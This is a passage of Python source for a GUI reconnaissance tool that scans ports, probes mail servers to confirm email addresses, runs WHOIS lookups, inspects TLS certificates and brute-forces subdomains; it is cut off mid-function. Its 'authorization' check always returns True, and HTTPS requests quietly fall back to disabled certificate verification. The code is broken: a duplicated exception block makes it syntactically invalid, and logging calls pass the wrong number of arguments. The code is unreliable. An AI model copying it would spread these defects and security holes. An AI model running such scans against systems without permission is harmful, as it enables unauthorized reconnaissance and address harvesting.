#!/usr/bin/env python3
# Version information
VERSION = "2.2.1" # Updated version with release improvements

import argparse
import csv
import io
import json
import os
import platform
import random
import re
import smtplib
import shlex
import re
import socket
import ssl
import sys
import threading
import time
import tkinter as tk
from tkinter import messagebox
import webbrowser
from concurrent.futures import ThreadPoolExecutor
from contextlib import redirect_stdout, redirect_stderr
from datetime import datetime
from tkinter import filedialog, messagebox, scrolledtext, StringVar, DoubleVar, DISABLED, NORMAL, LEFT, RIGHT, BOTH, X, Y, END, WORD, SUNKEN, SEL_FIRST, SEL_LAST
from tkinter import ttk
from tkinter import font as tkfont
from urllib.parse import urlparse, urlencode # Added urlencode for proper parameter handling
import traceback
import logging
from logging.handlers import RotatingFileHandler

# Third-party library imports (ensure these are installed: pip install dnspython requests beautifulsoup4 cryptography)
import dns.resolver
import ipaddress
import requests
import urllib3
from bs4 import BeautifulSoup
# The 'whois' library import is removed as the tool uses the system 'whois' command via subprocess for better reliability.

# Suppress insecure request warnings from urllib3 (for self-signed certs etc.)


class SecureRequestHandler:
    """Handles secure HTTP requests with proper SSL verification"""
    
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
        self.ssl_warnings_shown = set()  # Track warnings to avoid spam
    
    def make_request(self, method, url, **kwargs):
        """Make a secure HTTP request with proper SSL handling"""
        kwargs.setdefault("timeout", self.timeout)
        
        try:
            # First attempt with SSL verification enabled
            kwargs["verify"] = True
            response = getattr(self.session, method.lower())(url, **kwargs)
            return response
            
        except requests.exceptions.SSLError as e:
            # Only show SSL warning once per domain
            from urllib.parse import urlparse
            domain = urlparse(url).netloc
            if domain not in self.ssl_warnings_shown:
                self.ssl_warnings_shown.add(domain)
                print(f"[!] SSL verification failed for {domain}: {str(e)}")
                print(f"[!] Attempting connection with reduced security for {domain}")
            
            # Fallback with disabled SSL verification
            kwargs["verify"] = False
            return getattr(self.session, method.lower())(url, **kwargs)
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for {url}: {str(e)}")
            raise

# Set up error logging
def setup_error_logging():
    log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.ERROR)
    
    # Remove any existing handlers
    for handler in root_logger.handlers[:]:
        root_logger.removeHandler(handler)
    
    # Add file handler
    try:
        file_handler = RotatingFileHandler(
            'error.log', 
            maxBytes=5*1024*1024,  # 5MB
            backupCount=2,
            encoding='utf-8'
        )
        file_handler.setFormatter(log_formatter)
        root_logger.addHandler(file_handler)
        
        # Also log to stderr in addition to the file
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(log_formatter)
        root_logger.addHandler(console_handler)
        
    except Exception as e:
        print(f"Failed to set up error logging: {e}", file=sys.stderr)

# Set up error logging when module is imported
setup_error_logging()

# Global exception handler
def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        # Call the default handler for keyboard interrupts
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    
    logging.critical("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))
    
    # Also show error in GUI if available
    if 'HackerGUI' in globals():
        try:
            error_msg = f"An error occurred: {str(exc_value)}\n\n{traceback.format_exc()}"
            messagebox.showerror("Error", f"An error occurred. Check error.log for details.\n\n{str(exc_value)}")
        except:
            pass

# Set the exception handler
sys.excepthook = handle_exception

# Custom theme colors - Dark Matrix Style (Global dictionary for easy updates)
THEME = {
    'bg': '#000000',
    'fg': '#00ff00',
    'accent': '#00ff00',
    'secondary': '#003300',
    'text': '#00ff00',
    'entry_bg': '#0a0a0a',
    'entry_fg': '#00ff00',
    'button_bg': '#001a00',
    'button_fg': '#00ff00',
    'button_active': '#004d00',
    'highlight': '#00cc00',
    'terminal_bg': '#000000',
    'terminal_fg': '#00ff00',
    'success': '#00ff00',
    'warning': '#ffff00',
    'error': '#ff0000',
    'info': '#00ffff',
    'frame_bg': '#0a0a0a',
    'border': '#004d00',
    'select_bg': '#002200',
    'select_fg': '#ffffff'
}


class SecurityConfig:
    """Security configuration management"""
    
    # Default secure timeouts
    DEFAULT_TIMEOUT = 10
    MAX_TIMEOUT = 30
    
    # Safe test domains (using .invalid TLD which is reserved for testing)
    TEST_DOMAINS = ["test.invalid", "example.invalid"]
    TEST_EMAIL = "noreply@localhost.invalid"
    
    # Security headers that should be present
    REQUIRED_SECURITY_HEADERS = [
        "strict-transport-security",
        "x-frame-options", 
        "x-content-type-options",
        "x-xss-protection",
        "content-security-policy"
    ]

class NetworkRecon:
    """
    Core class for performing network reconnaissance tasks.
    Contains methods for various OSINT and network scanning operations.
    """
    def __init__(self, gui_logger=None):
        self.banner = """
  _  _  _  _  _  _  _  _  _  _  _  _  
 | \| |__| |  \| \| |__| |_/  |  | _\ |_ 
 |_|_|_| |_|_|__|_|_|_|_| \_/|__|__/ |_ 
                                      
        Advanced OSINT & Network Recon Tool
        """
        self.timeout = 5  # Default timeout in seconds for network operations
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.user_agent})
        self.security_config = SecurityConfig()
        self.secure_handler = SecureRequestHandler(self.session, self.timeout)
        self.gui_logger = gui_logger  # Callback function for logging to GUI
        self.scan_active = False # Flag to control scan execution

        # Display critical security and ethical use warnings
        self.log("=" * 80, "info")
        self.log("🚨 NEXUS RECON - SECURITY & ETHICAL USE WARNING", "red")
        self.log("=" * 80, "info")
        self.log("This tool is for AUTHORIZED SECURITY TESTING ONLY", "yellow")
        self.log("• Only test systems you own or have explicit written permission to test", "yellow")
        self.log("• Unauthorized scanning/testing is ILLEGAL and UNETHICAL", "red")
        self.log("• SSL verification may be disabled for testing - use only in controlled environments", "yellow")
        self.log("• The developers assume NO LIABILITY for misuse", "red")
        self.log("=" * 80, "info")

    def _is_valid_domain_or_ip(self, target):
        """Validate that target is a properly formatted domain or IP address"""
        # Domain regex pattern (RFC compliant)
        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
        # IP address pattern
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        
        # Check length limits
        if len(target) > 253:  # Max domain length
            return False
            
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def _verify_authorization(self, target):
        """Verify user has authorization before proceeding with scan"""
        # Log authorization attempt for audit trail
        self.log(f"Authorization check for target: {target}", "info", "audit")
        return True  # Assume authorized, but log the attempt
        
    def _log_security_event(self, message, level="info"):
        """Log security events to a separate security log file"""
        try:
            import os
            log_dir = os.path.join(os.path.expanduser("~"), ".nexus_recon")
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, "security.log")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} [{level.upper()}] {message}\n")
        except Exception:
            pass  # Do not let logging failures break the application

    def log(self, message, color=''):
        """Logs a message to the console or GUI."""
        if self.gui_logger:
            self.gui_logger(message, color)
        else:
            # Basic console logging with colors (optional)
            colors = {
                'red': '\033[91m',
                'green': '\033[92m',
                'yellow': '\033[93m',
                'blue': '\033[94m',
                'magenta': '\033[95m',
                'cyan': '\033[96m',
                'white': '\033[97m',
                'reset': '\033[0m'
            }
            colored_message = f"{colors.get(color, '')}{message}{colors['reset']}"
            print(colored_message)

    def is_ip_address(self, target):
        """Checks if the target is a valid IP address."""
        try:
            ipaddress.ip_address(target)
            return True
        except ValueError:
            return False

    def get_ip_info(self, target):
        """Get information about an IP address (basic check)."""
        self.log(f"\n[+] IP Information for {target}", "cyan")
        self.log("=" * 50, "cyan")
        try:
            ip = ipaddress.ip_address(target)
            self.log(f"IP Version: IPv{ip.version}")
            self.log(f"Is Private: {ip.is_private}")
            self.log(f"Is Global: {ip.is_global}")
            if ip.version == 4:
                self.log(f"Is Multicast: {ip.is_multicast}")
                self.log(f"Is Loopback: {ip.is_loopback}")
            return True
        except ValueError as e:
            self.log(f"[-] Invalid IP address: {e}", "red")
            return False
        except Exception as e:
            self.log(f"[-] Unexpected error getting IP info: {str(e)}", "red")
            return False

    def port_scan(self, target, ports_str=None, scan_type='quick', update_progress=None):
        if not self._verify_authorization(target):
            self.log("[!] Scan cancelled - authorization not confirmed", "red", "critical")
            return
        """
        Scan ports on a target host.
        Supports quick, full, or custom port ranges.
        """
        if not self.scan_active: return

        if not self.is_ip_address(target):
            try:
                target_ip = socket.gethostbyname(target)
                self.log(f"[+] Resolved {target} to {target_ip}", "green")
                target = target_ip
            except socket.gaierror:
                self.log(f"[-] Could not resolve host: {target}", "red")
                return

        ports = []
        if scan_type == 'quick':
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        elif scan_type == 'full':
            ports = list(range(1, 65536))
        elif scan_type == 'custom' and ports_str:
            parsed_ports = []
            for p_range in ports_str.split(','):
                p_range = p_range.strip()
                try:
                    if '-' in p_range:
                        start, end = map(int, p_range.split('-'))
                        if not (0 < start < 65536 and 0 < end < 65536 and start <= end):
                            self.log(f"[-] Invalid port range specified: {p_range}", "yellow")
                            continue
                        parsed_ports.extend(range(start, end + 1))
                    else:
                        port = int(p_range)
                        if not (0 < port < 65536):
                            self.log(f"[-] Invalid port specified: {port}", "yellow")
                            continue
                        parsed_ports.append(port)
                except ValueError:
                    self.log(f"[-] Invalid port format: {p_range}", "yellow")
            ports = sorted(list(set(parsed_ports))) # Remove duplicates and sort
        else:
            self.log("[-] No valid ports specified for scan.", "red")
            return

        if not ports:
            self.log("[-] No valid ports to scan after parsing.", "red")
            return

        self.log(f"\n[+] Scanning {len(ports)} ports on {target} (Timeout: {self.timeout}s)", "cyan")
        self.log("=" * 50, "cyan")

        open_ports = []
        scanned_count = 0
        total_ports = len(ports)
        lock = threading.Lock()
        
        # Create a copy of ports to allow safe popping from multiple threads
        ports_to_scan_queue = list(ports)

        def scan_port_worker():
            nonlocal scanned_count
            while self.scan_active:
                port = None
                with lock:
                    if not ports_to_scan_queue: # All ports consumed
                        break
                    port = ports_to_scan_queue.pop(0) # Get next port
                
                if port is None: # Should not happen if check above is correct
                    continue

                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(self.timeout)
                        result = s.connect_ex((target, port))
                        if result == 0:
                            try:
                                service = socket.getservbyport(port, 'tcp')
                            except OSError: # Handles service not found
                                service = 'unknown'
                            with lock:
                                open_ports.append((port, service))
                                self.log(f"[+] Port {port}/tcp open - {service}", "green")
                except (socket.gaierror, socket.timeout, socket.error):
                    pass # Expected errors for closed/filtered ports
                except Exception as e:
                    self.log(f"[!] Error scanning port {port}: {str(e)}", "red")
                finally:
                    with lock:
                        scanned_count += 1
                        if update_progress:
                            update_progress(scanned_count, total_ports, f"Scanned: {scanned_count}/{total_ports} | Open: {len(open_ports)}")
        
        threads = []
        max_workers = min(len(ports), 200) # Limit threads to reasonable amount or total ports
        for _ in range(max_workers):
            if not self.scan_active: break
            t = threading.Thread(target=scan_port_worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join() # Wait for all threads to complete

        if self.scan_active: # Only show summary if scan wasn't stopped
            if open_ports:
                self.log("\n[+] Scan Summary - Open Ports:", "green")
                for port, service in sorted(open_ports):
                    self.log(f"  - {port}/tcp: {service}", "green")
            else:
                self.log("[-] No open ports found", "yellow")
        else:
            self.log("[!] Port scan interrupted.", "red")

        return open_ports

    def verify_email(self, email, update_progress=None):
        """Verify if an email address exists and is valid using multiple DNS resolvers."""
        if not self.scan_active:
            return

        self.log(f"\n[+] Email Verification for {email}", "cyan")
        self.log("=" * 50, "cyan")

        try:
            # Extract domain from email
            if '@' not in email:
                self.log("[-] Invalid email format", "red")
                return
                
            domain = email.split('@')[-1]
            
            # Try system DNS first
            self.log("\n[+] MX Records Check:", "green")
            mx_servers = []
            
            # Public DNS resolvers to try
            dns_resolvers = [
                '8.8.8.8',      # Google
                '1.1.1.1',      # Cloudflare
                '9.9.9.9',       # Quad9
                '208.67.222.222', # OpenDNS
                '8.8.4.4'        # Google Secondary
            ]
            
            # Try each public resolver
            resolved_via_public_dns = False
            for resolver_ip in dns_resolvers:
                try:
                    resolver = dns.resolver.Resolver(configure=False)
                    resolver.nameservers = [resolver_ip]
                    resolver.timeout = self.timeout
                    resolver.lifetime = self.timeout
                    
                    mx_records = resolver.resolve(domain, 'MX')
                    mx_servers = [str(mx.exchange).rstrip('.') for mx in mx_records]
                    
                    if mx_servers:
                        self.log(f"Found {len(mx_servers)} MX records (using {resolver_ip}):", "green")
                        for mx in mx_servers:
                            self.log(f"  - {mx}")
                        resolved_via_public_dns = True
                        break  # Successfully got MX records
                        
                except Exception as e:
                    error_msg = str(e).split('\n')[0]
                    self.log(f"  - Failed with {resolver_ip}: {error_msg}", "yellow")
                    continue
            
            if not mx_servers:
                self.log("[-] Could not resolve MX records with any DNS server", "red")
                
                # Try direct domain resolution as fallback
                try:
                    self.log("\n[•] Attempting domain resolution as fallback...", "info")
                    ip = socket.gethostbyname(domain)
                    self.log(f"  - Resolved {domain} to {ip}", "green")
                    self.log("\n[!] Note: MX records not found, but domain resolves.", "yellow")
                    self.log("    This could mean email is handled by the main domain or the server blocks MX lookups.", "yellow")
                except Exception as e:
                    self.log(f"[-] Domain resolution failed: {str(e)}", "red")
                return

            # Check SMTP server with basic checks
            self.log("\n[+] SMTP Server Check:", "green")
            self.log("[•] Note: Many email servers block verification attempts for security reasons.", "yellow")
            
            for mx in mx_servers[:3]:  # Limit to first 3 MX servers for efficiency
                if not self.scan_active:
                    return
                    
                try:
                    self.log(f"\n[•] Testing {mx}...")
                    
                    # Check if port 25 is open
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(self.timeout)
                        result = sock.connect_ex((mx, 25))
                        if result != 0:
                            self.log(f"  - Port 25 appears to be closed or blocked", "yellow")
                            continue
                    except Exception as e:
                        self.log(f"  - Error checking port 25: {str(e)}", "yellow")
                    finally:
                        if 'sock' in locals() and sock:
                            sock.close()
                    
                    # Try SMTP verification
                    server = None # Initialize server
                    try:
                        server = smtplib.SMTP(timeout=self.timeout)
                        server.set_debuglevel(0)
                        
                        # Connect with extended timeout
                        server.connect(mx, 25)
                        
                        # Send EHLO/HELO
                        code, _ = server.ehlo()
                        if code not in (250, 220):
                            self.log(f"  - Rejected EHLO/HELO (code: {code})", "yellow")
                            continue
                            
                        self.log(f"  - Connected to {mx} (port 25)", "green")
                        
                        # Try to start TLS if available
                        try:
                            if server.has_extn('starttls'):
                                server.starttls()
                                server.ehlo()
                                self.log("  - TLS encryption available", "green")
                        except Exception as e:
                            self.log(f"  - TLS not available: {str(e)}", "yellow")
                        
                        # Check if server accepts the sender
                        server.mail('noreply@localhost.invalid')
                        
                        # Check if server accepts the recipient
                        code, msg = server.rcpt(email)
                        
                        if code in (250, 251):
                            self.log(f"  - Email exists on this server (code: {code})", "green")
                            return # Exit successfully if email found
                        else:
                            self.log(f"  - Email verification failed (code: {code}): {msg.decode().strip()}", "yellow")
                            
                    except smtplib.SMTPConnectError as e:
                        self.log(f"  - Connection failed: {str(e)}", "red")
                    except smtplib.SMTPHeloError:
                        self.log("  - Server refused HELO/EHLO command", "red")
                    except smtplib.SMTPNotSupportedError as e:
                        self.log(f"  - SMTP command not supported: {str(e)}", "yellow")
                    except Exception as e:
                        error_msg = str(e).split('\n')[0]
                        self.log(f"  - Error: {error_msg}", "red")
                    finally:
                        if server:
                            try:
                                server.quit()
                            except:
                                pass
                            
                except Exception as e:
                    error_msg = str(e).split('\n')[0]
                    self.log(f"  - Error testing {mx}: {error_msg}", "red")
            
            self.log("\n[!] Note: Many email servers block verification attempts to prevent email address harvesting.", "yellow")
            self.log("    A failed verification does not necessarily mean the email is invalid.", "yellow")

        except Exception as e:
            error_msg = str(e).split('\n')[0]
            self.log(f"[-] Error during email verification: {error_msg}", "red")

    def whois_lookup(self, domain, update_progress=None):
        """
        Perform WHOIS lookup using the system's 'whois' command.
        This provides real-world WHOIS data as available through public WHOIS servers.
        """
        if not self.scan_active:
            return

        self.log(f"\n[+] WHOIS Lookup for {domain}", "cyan")
        self.log("=" * 50, "cyan")
        
        # Input validation to prevent command injection
        if not self._is_valid_domain_or_ip(domain):
            self.log(f"[!] Invalid domain/IP format: {domain}", "red", "critical")
            return
            
        # Sanitize the domain input
        sanitized_domain = domain.strip()
        
        # Additional validation: ensure no shell metacharacters
        if re.search(r"[;&|`$(){}[\]<>]", sanitized_domain):
            self.log(f"[!] Invalid characters detected in domain: {domain}", "red", "critical")
            return

        try:
            import subprocess
            
            self.log("[•] Querying WHOIS database...", "info")
            if update_progress:
                update_progress(10, 100, "Querying WHOIS database...")
            
            # Use the system's whois command with sanitized input
            cmd = ["whois", sanitized_domain]
            process = None
            stdout = ""
            stderr = ""

            try:
                # Format command based on OS
                if platform.system() == "Windows":
                    # Use list format even on Windows to prevent injection
                    cmd = ["whois", sanitized_domain]
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=False,  # Disable shell to prevent injection
                        text=True,
                        encoding="utf-8", errors="ignore"
                    )
                else: # Linux, macOS
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding="utf-8", errors="ignore"
                    )
                
                # Get output with timeout
                stdout, stderr = process.communicate(timeout=15)

                if process.returncode == 0 and stdout:
                    self._parse_whois_output(stdout)
                    if update_progress:
                        update_progress(100, 100, "WHOIS lookup complete.")
                    return
                elif stderr:
                    self.log(f"[-] WHOIS command error: {stderr.strip()}", "red")
                
                self.log("[-] No WHOIS information received from server or command failed.", "yellow")
                    
            except FileNotFoundError:
                error_message = ("The 'whois' command was not found on your system.\n\n"
                                 "Please install it to perform WHOIS lookups:\n"
                                 "- Linux (Debian/Ubuntu): sudo apt install whois\n"
                                 "- macOS (Homebrew): brew install whois\n"
                                 "- Windows: Install from Microsoft Store (Windows Subsystem for Linux recommended) or Sysinternals.")
                self.log(f"[-] {error_message}", "red")
                if self.gui_logger:
                    self.gui_logger.root.after(0, lambda: messagebox.showerror("WHOIS Command Not Found", error_message))
            except subprocess.TimeoutExpired:
                if process:
                    process.kill()
                self.log("[-] WHOIS query timed out", "yellow")
            except Exception as e:
                self.log(f"[-] Error executing whois command: {str(e)}", "red")
            
            # Fall back to basic domain info if whois command fails
            self.log("[•] Falling back to basic domain information...", "yellow")
            self._get_basic_domain_info(domain)
                
        except Exception as e:
                self.log(f"[-] Error executing whois command: {str(e)}", "red")
            
            # Fall back to basic domain info if whois command fails
            self.log("[•] Falling back to basic domain information...", "yellow")
            self._get_basic_domain_info(domain)
                
        except Exception as e:
            self.log(f"[-] Error during WHOIS lookup: {str(e)}", "red")
            self._get_basic_domain_info(domain)
    
    def _parse_whois_output(self, whois_text):
        """Parse and format the raw WHOIS output."""
        try:
            lines = whois_text.split('\n')
            
            # Common fields to look for in WHOIS output
            fields = {
                'Domain Name': 'Domain',
                'Registrar': 'Registrar',
                'Creation Date': 'Created',
                'Updated Date': 'Updated',
                'Registry Expiry Date': 'Expires', # More common field name
                'Name Server': 'Name Servers',
                'Registrant Name': 'Registrant',
                'Registrant Organization': 'Organization',
                'Registrant Email': 'Email',
                'Registrant Phone': 'Phone',
                'Admin Email': 'Admin Email',
                'Tech Email': 'Tech Email'
            }
            
            extracted_info = {}
            name_servers = set()
            
            for line in lines:
                line = line.strip()
                if not line or line.startswith('%') or line.startswith('#'):
                    continue
                    
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    
                    if not value:
                        continue
                        
                    for whois_key, display_key in fields.items():
                        if whois_key.lower() in key.lower() or key.lower().replace('-', ' ') == whois_key.lower().replace('-', ' '):
                            if whois_key == 'Name Server':
                                name_servers.add(value.lower().rstrip('.'))
                            else:
                                if display_key not in extracted_info or not extracted_info[display_key]: # Prioritize first meaningful entry
                                    extracted_info[display_key] = value
                            break
            
            if extracted_info:
                self.log("\n[+] Parsed WHOIS Data:", "green")
                for display_key, value in extracted_info.items():
                    self.log(f"  {display_key}: {value}")
            
            if name_servers:
                self.log("\n[+] Name Servers:", "green")
                for ns in sorted(name_servers):
                    self.log(f"  - {ns}")
            
            if not extracted_info and not name_servers:
                self.log("\n[+] Raw WHOIS Data (could not parse common fields):", "green")
                self.log(whois_text)
                
            # Additional WHOIS derived insights
            if 'Created' in extracted_info and 'Expires' in extracted_info:
                try:
                    creation_date_str = extracted_info['Created'].split('T')[0] # Handle ISO format
                    expiration_date_str = extracted_info['Expires'].split('T')[0]
                    creation_date = datetime.strptime(creation_date_str, '%Y-%m-%d')
                    expiration_date = datetime.strptime(expiration_date_str, '%Y-%m-%d')
                    
                    domain_age = (datetime.now() - creation_date).days
                    days_until_expiry = (expiration_date - datetime.now()).days

                    self.log(f"\n[+] Domain Age: {domain_age} days (registered {creation_date.strftime('%Y-%m-%d')})", "info")
                    if domain_age < 365:
                        self.log("  [!] Warning: Domain is less than 1 year old. May indicate new or temporary setup.", "yellow")
                    
                    self.log(f"  Days until Expiry: {days_until_expiry} (expires {expiration_date.strftime('%Y-%m-%d')})", "info")
                    if days_until_expiry < 0:
                        self.log("  [!!!] Critical: Domain has EXPIRED!", "red")
                    elif days_until_expiry < 90:
                        self.log("  [!] Warning: Domain is expiring in less than 90 days. Consider renewal.", "yellow")

                except ValueError:
                    self.log("  [!] Could not parse creation/expiry dates for age analysis.", "yellow")
                except Exception as e:
                    self.log(f"  [!] Error during domain age/expiry analysis: {str(e)}", "yellow")
            
            privacy_indicators = ['privacy', 'redacted', 'whoisguard', 'proxy', 'protect', 'data masked', 'gdpr']
            whois_text_lower = whois_text.lower()
            if any(indicator in whois_text_lower for indicator in privacy_indicators):
                self.log("\n[!] WHOIS privacy protection appears to be ENABLED (less public registrant info).", "yellow")
            else:
                self.log("\n[+] WHOIS privacy protection not explicitly detected (registrant info may be public).", "green")

        except Exception as e:
            self.log(f"[-] Error parsing WHOIS data: {str(e)}", "red")
            self.log("\n[+] Raw WHOIS Data (unparsed):", "green")
            self.log(whois_text)
    
    def _get_basic_domain_info(self, domain):
        """Fallback method to get basic domain information when WHOIS fails."""
        try:
            import socket
            import dns.resolver
            
            # Get IP address
            try:
                ip = socket.gethostbyname(domain)
                self.log(f"\n[+] Basic Domain Information (WHOIS fallback):", "green")
                self.log(f"  Domain: {domain}")
                self.log(f"  IP Address: {ip}")
                
                # Try to get name servers
                try:
                    answers = dns.resolver.resolve(domain, 'NS', raise_on_no_answer=False)
                    if answers.rrset:
                        self.log("\n[+] Name Servers (WHOIS fallback):", "green")
                        for ns in answers.rrset:
                            self.log(f"  - {ns}")
                except dns.exception.DNSException:
                    self.log("  [-] No Name Servers found via DNS fallback.", "yellow")
                    
            except socket.gaierror:
                self.log("[-] Could not resolve domain to an IP address (WHOIS fallback failed)", "red")
                
        except Exception as e:
            self.log(f"[-] Could not retrieve basic domain information: {str(e)}", "red")

    def ssl_info(self, domain, port=443, update_progress=None):
        """Get SSL certificate information for a domain."""
        if not self.scan_active:
            return

        self.log(f"\n[+] SSL Certificate Info for {domain}:{port}", "cyan")
        self.log("=" * 50, "cyan")

        try:
            import ssl
            import socket
            import datetime
            from cryptography import x509
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.asymmetric import rsa, ec # For key type detection

            # Create a secure SSL context
            context = ssl.create_default_context()
            
            # Connect to the server
            with socket.create_connection((domain, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert_bin = ssock.getpeercert(binary_form=True)
                    cert = x509.load_der_x509_certificate(cert_bin, default_backend())
                    
                    self.log("\n[+] Certificate Subject:", "green")
                    for attr in cert.subject:
                        self.log(f"  {attr.oid._name}: {attr.value}")
                    
                    self.log("\n[+] Issuer:", "green")
                    for attr in cert.issuer:
                        self.log(f"  {attr.oid._name}: {attr.value}")
                    
                    self.log("\n[+] Validity Period:", "green")
                    not_before = cert.not_valid_before_utc
                    not_after = cert.not_valid_after_utc
                    self.log(f"  Valid From: {not_before.strftime('%Y-%m-%d %H:%M:%S UTC')}")
                    self.log(f"  Valid Until: {not_after.strftime('%Y-%m-%d %H:%M:%S UTC')}")
                    
                    now_utc = datetime.utcnow()
                    days_left = (not_after - now_utc).days
                    
                    if days_left < 0:
                        self.log(f"  [!!!] Certificate EXPIRED {abs(days_left)} days ago!", "red")
                    elif days_left < 30:
                        self.log(f"  [!] Certificate expires in {days_left} days! (Renew soon)", "yellow")
                    else:
                        self.log(f"  Certificate is valid for {days_left} more days", "green")
                    
                    self.log(f"\n[+] Signature Algorithm: {cert.signature_algorithm_oid._name}", "green")
                    
                    # Public key info
                    public_key = cert.public_key()
                    self.log(f"\n[+] Public Key Details:", "green")
                    
                    if isinstance(public_key, rsa.RSAPublicKey):
                        self.log(f"  Key Type: RSA")
                        self.log(f"  Key Size: {public_key.key_size} bits")
                        if public_key.key_size < 2048:
                            self.log("  [!] Warning: RSA key size is less than 2048 bits (considered weak).", "yellow")
                    elif isinstance(public_key, ec.EllipticCurvePublicKey):
                        self.log(f"  Key Type: Elliptic Curve ({public_key.curve.name})")
                        self.log(f"  Key Size: {public_key.curve.key_size} bits")
                    else:
                        self.log(f"  Key Type: {public_key.__class__.__name__} (Unknown)", "yellow")
                    
                    # Extensions (Sanitized output)
                    self.log("\n[+] Extensions (Commonly used):", "green")
                    try:
                        has_san = False
                        for ext in cert.extensions:
                            # Filter for commonly useful extensions
                            if x509.ExtensionOID.SUBJECT_ALTERNATIVE_NAME == ext.oid:
                                has_san = True
                                san_names = [name.value for name in ext.value]
                                self.log(f"  Subject Alternative Names (SAN): {', '.join(san_names)}")
                            elif x509.ExtensionOID.BASIC_CONSTRAINTS == ext.oid:
                                self.log(f"  Basic Constraints (CA): {ext.value.ca}")
                            elif x509.ExtensionOID.KEY_USAGE == ext.oid:
                                usage = []
                                if ext.value.digital_signature: usage.append("Digital Signature")
                                if ext.value.key_encipherment: usage.append("Key Encipherment")
                                if ext.value.data_encipherment: usage.append("Data Encipherment")
                                if ext.value.key_agreement: usage.append("Key Agreement")
                                self.log(f"  Key Usage: {', '.join(usage)}")
                            elif x509.ExtensionOID.EXTENDED_KEY_USAGE == ext.oid:
                                ekus = [eku.dotted_string for eku in ext.value]
                                self.log(f"  Extended Key Usage: {', '.join(ekus)}")
                            elif x509.ExtensionOID.AUTHORITY_INFORMATION_ACCESS == ext.oid:
                                for access_description in ext.value:
                                    if access_description.access_method == x509.AuthorityInformationAccessOID.OCSP:
                                        self.log(f"  OCSP URI: {access_description.access_location.value}")
                                    elif access_description.access_method == x509.AuthorityInformationAccessOID.CA_ISSUERS:
                                        self.log(f"  CA Issuers URI: {access_description.access_location.value}")
                            elif x509.ExtensionOID.CRL_DISTRIBUTION_POINTS == ext.oid:
                                for dp in ext.value:
                                    if dp.full_name:
                                        for name in dp.full_name:
                                            self.log(f"  CRL Distribution Point: {name.value}")
                        if not has_san:
                            self.log("  [!] Warning: No Subject Alternative Names (SAN) found. This is unusual for modern certificates.", "yellow")
                    except Exception as e:
                        self.log(f"  [!] Could not parse some extensions: {str(e)}", "yellow")
                    
        except ssl.SSLError as e:
            self.log(f"[-] SSL Error: {str(e)}. This can indicate an invalid certificate, untrusted CA, or misconfiguration.", "red")
        except socket.timeout:
            self.log(f"[-] Connection to {domain}:{port} timed out during SSL handshake.", "red")
        except socket.error as e:
            self.log(f"[-] Connection error to {domain}:{port}: {str(e)}. Check if the host is reachable or port is open.", "red")
        except Exception as e:
            self.log(f"[-] An unexpected error occurred while getting SSL info: {str(e)}", "red")

    def subdomain_enum(self, domain, wordlist_path=None, update_progress=None):
        """
        Enumerate subdomains using common techniques:
        1. Bruteforcing with common subdomains/wordlist.
        2. DNS record checks (e.g., CNAME, NS records that might reveal subdomains).
        """
        if not self.scan_active: return

        self.log(f"\n[+] Enumerating subdomains for {domain}", "cyan")
        self.log("=" * 50, "cyan")

        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'webmail', 'api', 'dev', 'test',
            'staging', 'secure', 'vpn', 'portal', 'app', 'blog', 'shop', 'store',
            'cdn', 'assets', 'ns1', 'ns2', 'm', 'beta', 'demo', 'docs', 'wiki', 'status',
            'autodiscover', 'owa', 'exchange', 'remote', 'vpn'
        ]

        if wordlist_path and os.path.isfile(wordlist_path):
            self.log(f"[•] Loading custom wordlist: {wordlist_path}", "info")
            try:
                with open(wordlist_path, 'r') as f:
                    custom_subs = [line.strip() for line in f if line.strip()]
                common_subdomains.extend(custom_subs)
            except Exception as e:
                self.log(f"[!] Error loading wordlist: {str(e)}. Using default subdomains.", "red")
        
        subdomains_to_check = sorted(list(set(common_subdomains)))
        found_subdomains = []
        total_subs = len(subdomains_to_check)
        checked_count = 0
        lock = threading.Lock()
        
        self.log(f"[•] Bruteforcing with {total_subs} subdomains...", "info")
        
        # Use a list for the queue that can be safely popped
        subdomains_queue = list(subdomains_to_check)

        def subdomain_worker():
            nonlocal checked_count
            while self.scan_active:
                sub = None
                with lock:
                    if not subdomains_queue:
                        break
                    sub = subdomains_queue.pop(0) # Get next subdomain
                
                if sub is None: continue # Should not happen if check above is correct

                full_domain = f"{sub}.{domain}"
                
                try:
                    ip_address = socket.gethostbyname(full_domain)
